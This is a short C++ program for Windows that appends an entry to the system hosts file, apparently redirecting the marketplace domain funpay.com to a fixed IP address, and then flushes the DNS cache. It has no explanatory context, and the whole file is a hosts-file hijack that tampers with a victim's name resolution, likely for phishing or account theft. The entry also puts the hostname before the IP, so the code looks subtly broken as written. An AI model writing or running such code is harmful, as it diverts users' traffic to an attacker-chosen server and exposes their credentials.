#include <iostream>
#include <fstream>
#include <string>



void change_hosts(std::string file_path, std::string dns_record)
{
    std::ofstream vmdelet_out;
    vmdelet_out.open(file_path, std::ios::app);
    vmdelet_out << dns_record;
    vmdelet_out.close();
}

int main()
{
    std::string file_path = "C:\\Windows\\System32\\drivers\\etc\\hosts";
    std::string dns_record = "\nfunpay.com 37.48.72.4";

    change_hosts(file_path, dns_record);

    system("ipconfig /flushdns");
}

